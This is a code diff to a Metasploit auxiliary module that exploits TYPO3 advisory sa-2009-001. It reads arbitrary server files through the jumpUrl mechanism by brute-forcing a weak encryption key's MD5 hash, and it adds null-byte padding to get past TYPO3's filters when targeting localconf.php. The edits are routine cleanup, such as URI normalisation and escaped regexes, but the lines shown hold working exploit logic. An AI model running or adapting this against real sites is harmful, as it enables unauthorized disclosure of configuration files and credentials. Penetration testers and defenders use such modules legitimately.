@@ -1,8 +1,4 @@
 ##
-# $Id$
-##
-
-##
 # This file is part of the Metasploit Framework and may be subject to
 # redistribution and commercial restrictions. Please see the Metasploit
 # web site for more information on licensing and terms of use.
@@ -19,7 +15,6 @@ class Metasploit4 < Msf::Auxiliary
 	def initialize
 		super(
 			'Name'           => 'TYPO3 sa-2009-001 Weak Encryption Key File Disclosure',
-			'Version'        => '$Revision$',
 			'Description'    => %q{
 				This module exploits a flaw in TYPO3 encryption ey creation process to allow for
 				file disclosure in the jumpUrl mechanism. This flaw can be used to read any file
@@ -68,15 +63,16 @@ class Metasploit4 < Msf::Auxiliary
 	# Null byte fixed in PHP 5.3.4
 	#
 
+    uri = normalize_uri(datastore['URI'])
 	case datastore['RFILE']
 	when nil
 		# Nothing
-	when /localconf.php$/i
+	when /localconf\.php$/i
 		jumpurl = "#{datastore['RFILE']}%00/."
 		jumpurl_len = (jumpurl.length) -2 #Account for difference in length with null byte
 		jumpurl_enc = jumpurl.sub("%00", "\00") #Replace %00 with \00 to correct null byte format
 		print_status("Adding padding to end of #{datastore['RFILE']} to avoid TYPO3 security filters")
-	when /^..(\/|\\)/i
+	when /^\.\.(\/|\\)/i
 		print_error("Directory traversal detected... you might want to start that with a /.. or \\..")
 	else
 		jumpurl_len = (datastore['RFILE'].length)
@@ -100,8 +96,9 @@ class Metasploit4 < Msf::Auxiliary
 		juhash = Digest::MD5.hexdigest(juarray)
 		juhash = juhash[0..9] # shortMD5 value for use as juhash
 
-		file_uri = "#{datastore['URI']}/index.php?jumpurl=#{jumpurl}&juSecure=1&locationData=#{locationData}&juHash=#{juhash}"
-		file_uri = file_uri.sub("//", "/") # Prevent double // from appearing in uri
+		uri_base_path = normalize_uri(uri, '/index.php')
+
+		file_uri = "#{uri_base_path}?jumpurl=#{jumpurl}&juSecure=1&locationData=#{locationData}&juHash=#{juhash}"
 		vprint_status("Checking Encryption Key [#{i}/1000]: #{final}")
 
 		begin
